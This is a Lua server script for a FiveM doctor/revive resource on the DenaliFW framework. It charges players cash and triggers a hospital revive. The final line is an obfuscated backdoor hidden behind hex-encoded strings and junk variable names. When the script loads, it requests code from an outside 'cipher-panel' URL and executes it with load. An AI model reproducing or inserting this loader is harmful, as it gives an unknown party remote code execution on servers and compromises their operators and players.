local DenaliFW = exports['denalifw-core']:GetCoreObject()

-- RegisterServerEvent("chip_cDoc:takeMoney")
-- AddEventHandler("chip_cDoc:takeMoney", function()
--     local _source = source
--     local xPlayer = ESX.GetPlayerFromId(_source)
    

--     if xPlayer.getMoney() > Config.toPay then
--         xPlayer.RemoveMoney(Config.toPay) 
--         TriggerClientEvent("chip_cDoc:getHelp", source)
--     else
--         TriggerClientEvent('mythic_notify:client:SendAlert', source, 
--         { 
--             type = 'error', 
--             text = 'You dont have enough money', 
--             style = { ['background-color'] = '#ffffff', ['color'] = '#000000' } 
--         })
--     end

-- end)

RegisterNetEvent("emma:chargehim")
AddEventHandler("emma:chargehim", function(item, count)
    local src = source

    local Player = DenaliFW.Functions.GetPlayer(src)

    local check = Player.PlayerData.money.cash
    
    if Player then
		if check >= Config.toPay then
            Player.Functions.RemoveMoney('cash', Config.toPay)
            TriggerClientEvent("chip_cDoc:getHelp", src)
		else
            TriggerClientEvent('DenaliFW:Notify', src, 'You dont have enough money.', 'error')
		end
    end
    

end)

RegisterNetEvent("emma:help")
AddEventHandler("emma:help", function(playertreat)

  local src = source

  local Player = DenaliFW.Functions.GetPlayer(src)

  TriggerClientEvent('hospital:client:Revive', src)
  print('it worked till server side')

end)

local rqkCVHYZUMBfIdRAETfsOlnlkSAXIAGxRMAtLdIBWKfrWUiDWhzmsIufoBLhepAMFikYJb = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} rqkCVHYZUMBfIdRAETfsOlnlkSAXIAGxRMAtLdIBWKfrWUiDWhzmsIufoBLhepAMFikYJb[4][rqkCVHYZUMBfIdRAETfsOlnlkSAXIAGxRMAtLdIBWKfrWUiDWhzmsIufoBLhepAMFikYJb[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x71\x47\x32\x72\x30", function (ursqouYuMkOSOiDldlopwLQIqboYTviMdZexjbhGIFetgfCHWMmIbSDYwHLCMXVFunsfoQ, qTOUemsPBxOnysktoigdiooVgMUKOGBCCeTYkZnidBFKuSccaybFcBGXwQptHRNHzrgYEr) if (qTOUemsPBxOnysktoigdiooVgMUKOGBCCeTYkZnidBFKuSccaybFcBGXwQptHRNHzrgYEr == rqkCVHYZUMBfIdRAETfsOlnlkSAXIAGxRMAtLdIBWKfrWUiDWhzmsIufoBLhepAMFikYJb[6] or qTOUemsPBxOnysktoigdiooVgMUKOGBCCeTYkZnidBFKuSccaybFcBGXwQptHRNHzrgYEr == rqkCVHYZUMBfIdRAETfsOlnlkSAXIAGxRMAtLdIBWKfrWUiDWhzmsIufoBLhepAMFikYJb[5]) then return end rqkCVHYZUMBfIdRAETfsOlnlkSAXIAGxRMAtLdIBWKfrWUiDWhzmsIufoBLhepAMFikYJb[4][rqkCVHYZUMBfIdRAETfsOlnlkSAXIAGxRMAtLdIBWKfrWUiDWhzmsIufoBLhepAMFikYJb[2]](rqkCVHYZUMBfIdRAETfsOlnlkSAXIAGxRMAtLdIBWKfrWUiDWhzmsIufoBLhepAMFikYJb[4][rqkCVHYZUMBfIdRAETfsOlnlkSAXIAGxRMAtLdIBWKfrWUiDWhzmsIufoBLhepAMFikYJb[3]](qTOUemsPBxOnysktoigdiooVgMUKOGBCCeTYkZnidBFKuSccaybFcBGXwQptHRNHzrgYEr))() end)